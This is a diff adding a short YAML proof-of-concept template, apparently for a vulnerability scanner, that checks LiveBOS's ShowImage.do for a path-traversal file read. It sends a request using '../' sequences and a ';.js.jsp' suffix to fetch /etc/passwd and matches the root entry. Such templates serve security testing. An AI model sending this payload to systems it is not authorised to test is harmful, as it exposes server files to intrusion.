@@ -1,0 +1,16 @@
+name: LiveBOS-ShowImage.do-file-read
+set:
+  s0: randomInt(10000,99999)
+groups:
+  poc:  
+    - method: GET
+      path: /feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
+      follow_redirects: false 
+      body:
+      expression: >-
+        response.status == 200 && "root:.*:0:0:".bmatches(response.body)
+
+detail: 
+  links: 
+  authors:
+
